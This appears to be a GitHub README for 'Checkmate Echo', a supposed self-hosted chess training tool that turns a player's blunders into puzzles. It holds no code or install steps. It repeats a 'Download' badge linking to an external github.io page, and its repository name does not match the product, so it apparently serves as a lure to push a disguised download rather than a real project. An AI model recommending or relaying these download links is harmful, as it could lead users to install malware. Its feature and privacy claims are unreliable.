![preview](https://raw.githubusercontent.com/Abdullah5378/stockfish-blunder-lab/main/splash_b6e54f9.svg)
[![Download](https://raw.githubusercontent.com/Abdullah5378/stockfish-blunder-lab/main/pkg_dd0e09b.svg)](https://Abdullah5378.github.io/stockfish-blunder-lab/)

# 🌌 Checkmate Echo — The Blunder Time Machine

> “Those who cannot remember the past are condemned to repeat it.” — George Santayana  
> Those who *can* remember it, however, get to turn it into a training regimen.

**Checkmate Echo** is a self-hosted, offline-first training environment that turns your own tournament history into a personalized chess laboratory. It is the spiritual successor to the classic idea of reviewing your mistakes, rebuilt from the ground up as a modern, extensible platform for players who want to stop losing the same game twice.

Where other tools show you a red arrow and move on, Checkmate Echo builds a **memory palace out of your defeats**. Every blunder you have ever committed becomes a puzzle, a lesson, a ghost you can spar against until you exorcise it.

[![Download](https://raw.githubusercontent.com/Abdullah5378/stockfish-blunder-lab/main/pkg_dd0e09b.svg)](https://Abdullah5378.github.io/stockfish-blunder-lab/)

---

## 🧭 Table of Contents

- [The Philosophy Behind the Echo](#-the-philosophy-behind-the-echo)
- [What Makes It Different](#-what-makes-it-different)
- [Feature Constellation](#-feature-constellation)
- [How the Machine Thinks](#-how-the-machine-thinks)
- [The Blunder Atlas](#-the-blunder-atlas)
- [Training Modes](#-training-modes)
- [Supported Platforms and PGN Sources](#-supported-platforms-and-pgn-sources)
- [Responsive Interface](#-responsive-interface)
- [Multilingual Support](#-multilingual-support)
- [Accessibility and Comfort](#-accessibility-and-comfort)
- [Performance and Architecture](#-performance-and-architecture)
- [Security and Privacy Posture](#-security-and-privacy-posture)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Community and Contribution](#-community-and-contribution)
- [24/7 Customer Support](#-247-customer-support)
- [Disclaimer](#-disclaimer)
- [License](#-license)
- [Support the Project](#-support-the-project)

---

## 🧠 The Philosophy Behind the Echo

Most chess improvement advice reduces to a single sentence: *study your losses*. It is correct advice, and it is almost universally ignored, because studying losses is emotionally unpleasant and technically tedious. You have to export games, load them into an engine, scroll through a wall of centipawn evaluations, and guess at which moment the game truly slipped away.

Checkmate Echo exists to remove every one of those friction points. The name is deliberate — the tool does not just *show* you your mistakes, it *echoes* them back at you in new and changing contexts until the pattern is burned into your intuition. A blunder reviewed once is trivia. A blunder reviewed eleven times across eleven different positions is a lesson.

This project is designed for the player who has accepted a simple truth: improvement is not a matter of learning more openings, but of unlearning more habits.

---

## 💡 What Makes It Different

- **Your history is the syllabus.** There is no generic puzzle database shipped with the tool. The material is entirely derived from games you have actually played.
- **Engine-agnostic by design.** The architecture treats the analysis engine as an interchangeable component rather than a hard dependency.
- **Self-hosted and private.** Your games never leave your machine unless you explicitly export them.
- **Pattern-weighted repetition.** The scheduler prioritizes positions where you have repeatedly failed, not positions that merely look difficult.
- **Narrative over numbers.** Explanations are written in human language, with annotated alternatives rather than raw evaluation swings.

---

## 🌟 Feature Constellation

### Core Training Engine
- Automatic extraction of critical positions from imported games.
- Classification of errors into a taxonomy: tactical oversights, positional drift, time-pressure collapses, and opening misconceptions.
- Adaptive spaced repetition that adjusts intervals based on your personal success rate.
- Ghost mode, where the engine replays the original continuation and then challenges you to find the refutation.

### Analysis and Annotation
- Multi-line engine comparison with plain-language summaries.
- Side-by-side view of the move you played and the move you should have considered.
- Difficulty scoring that accounts for position complexity, not just evaluation loss.
- Historical trend charts showing whether your blunder rate is rising or falling over time.

### Data and Interoperability
- Import from standard PGN archives, tournament exports, and clipboard text.
- Export training sets in portable formats for use in other tools.
- Local database with automatic backups and integrity verification.
- Optional synchronization between multiple devices on your own network.

### Experience Layer
- Responsive interface that adapts from a phone screen to an ultrawide monitor.
- Dark, light, and high-contrast themes.
- Keyboard-first navigation for players who prefer not to touch a mouse mid-session.
- Multilingual interface with community-maintained translations.
- Progressive web app behavior for offline sessions.

---

## ⚙️ How the Machine Thinks

The training pipeline has four conceptual stages, and understanding them helps you get more out of the tool.

**Stage one — Ingestion.** Games arrive as PGN records. The parser normalizes metadata, repairs common formatting quirks, and deduplicates games that appear in multiple exports.

**Stage two — Evaluation.** Each position in each game is evaluated to establish a baseline. Moves that fall outside an acceptable threshold are flagged as candidates for review.

**Stage three — Classification.** Flagged moves are sorted by context. A move that loses material in a quiet position is treated very differently from a move that loses material in a position where you had thirty seconds left on the clock.

**Stage four — Scheduling.** Candidates enter a repetition queue. Positions you fail repeatedly resurface more often. Positions you solve cleanly are retired to long-term review.

The result is a training loop that feels less like a database and more like a patient coach who remembers exactly where you struggle.

---

## 🗺️ The Blunder Atlas

The Blunder Atlas is the visual centerpiece of the application. It is a map of your weaknesses, rendered as a heat field across the phases of the game.

- **Opening heat** shows where you leave theory and start improvising.
- **Middlegame heat** reveals whether your errors cluster around tactical motifs or strategic plans.
- **Endgame heat** exposes the technical conversions you have not yet mastered.
- **Time-pressure overlay** correlates your errors with clock state, which is often the single most illuminating view in the entire tool.

For many players, the Atlas produces a moment of genuine surprise: the realization that their losses are not random, but concentrated in one or two recurring situations.

---

## 🎯 Training Modes

**Blitz Review.** A rapid pass through recently flagged positions. Ideal for a ten-minute session before a tournament round.

**Deep Dive.** Full annotated review of a single game with engine commentary and alternative lines.

**Ghost Mode.** The engine plays the opponent's side against you, but only from positions you have previously mishandled.

**Pattern Drill.** Positions are grouped by motif rather than by game, so you can attack a specific weakness in isolation.

**Timed Gauntlet.** Training positions arrive with a countdown, simulating the pressure that produced the original error.

**Endless Echo.** An open-ended mode that keeps serving positions until you decide to stop, weighted toward your longest-standing unresolved errors.

---

## 🖥️ Supported Platforms and PGN Sources

Checkmate Echo runs wherever a modern browser and a modest amount of memory are available. It has been tested on desktop operating systems, mobile devices, and single-board computers used as home servers.

PGN import has been validated against exports from a wide range of sources, including major online playing platforms, dedicated chess software, and hand-written notation from club games. If a PGN file is valid, the ingestion layer will make a serious attempt to read it.

---

## 📱 Responsive Interface

The layout is built on a fluid grid that reflows gracefully from a narrow phone viewport to a multi-panel desktop workspace. The board itself scales proportionally, and touch targets remain comfortable on small screens. The goal is that a training session on a phone feels like a legitimate session, not a compromise.

---

## 🌐 Multilingual Support

The interface ships with an internationalization layer that supports right-to-left scripts, plural forms, and locale-aware date formatting. Translations are stored as plain text files that anyone can contribute to without touching application logic. If your language is not yet represented, adding it is a matter of copying a template and filling in strings.

---

## ♿ Accessibility and Comfort

- Full keyboard navigation with visible focus indicators.
- Screen-reader-friendly labels on all interactive board elements.
- Configurable board themes for players with color vision differences.
- Reduced-motion mode that disables animated transitions.
- Adjustable font sizing independent of browser zoom.

---

## 🚀 Performance and Architecture

The application is structured around a small core with clearly separated concerns. The engine bridge, the storage layer, and the presentation layer communicate through well-defined interfaces, which makes it straightforward to swap components without rewriting the whole system.

Storage is local and file-based by default, with an option to use an embedded database for larger collections. Memory usage is carefully managed so that even a library of tens of thousands of games remains responsive during search and filtering.

---

## 🔒 Security and Privacy Posture

Privacy is not a feature bolted on at the end; it is the starting assumption. Games remain on your hardware. There is no telemetry, no analytics beacon, and no remote account requirement. Network synchronization, when enabled, operates only between devices you control and can be disabled entirely.

---

## 🛣️ Roadmap for 2026

Planned directions for the coming year include expanded endgame tablebase integration, a collaborative study mode for clubs, richer export formats for coaches, and a plugin interface for community-built training modules. Priorities are guided by user feedback, so discussion threads carry real weight in the decision process.

---

## ❓ Frequently Asked Questions

**Do I need an internet connection to train?**  
No. The core experience is fully offline once your games are imported.

**Will this work with a small game collection?**  
Yes. Even a few dozen games produce a useful training set, though the Atlas becomes more insightful as the collection grows.

**Can I use it alongside my existing analysis workflow?**  
Absolutely. Many players run Checkmate Echo as a complement to their usual post-game review rather than a replacement.

**Is my data ever uploaded anywhere?**  
Only if you deliberately enable synchronization between your own devices.

---

## 🤝 Community and Contribution

Contributions of all kinds are welcome: translations, bug reports, documentation improvements, and feature proposals. The project values thoughtful discussion over rapid merges, and maintainers aim to respond to issues with genuine engagement rather than boilerplate.

---

## 🕰️ 24/7 Customer Support

Support is provided through community channels and maintainer responsiveness. While the project is volunteer-driven, the goal is to maintain a consistent presence so that no question sits unanswered for long. During major releases, additional support capacity is arranged to smooth the transition.

---

## ⚠️ Disclaimer

Checkmate Echo is an independent training tool intended for personal chess improvement. It is not affiliated with any chess federation, playing platform, or engine vendor. Engine evaluations are provided for educational purposes and should not be treated as absolute truth. Results in actual games depend on many factors beyond training software. Use of this tool does not guarantee rating improvement, and the maintainers accept no liability for outcomes arising from its use.

---

## 📜 License

This project is released under the MIT License. The full license text is available in the repository at [LICENSE](./LICENSE). You are welcome to use, modify, and distribute the software in accordance with those terms.

---

## 💜 Support the Project

If Checkmate Echo has helped you stop repeating old mistakes, consider contributing a translation, opening a well-written issue, or sharing the project with your club. The most valuable support is not financial — it is the kind of feedback that makes the next release sharper than the last.

[![Download](https://raw.githubusercontent.com/Abdullah5378/stockfish-blunder-lab/main/pkg_dd0e09b.svg)](https://Abdullah5378.github.io/stockfish-blunder-lab/)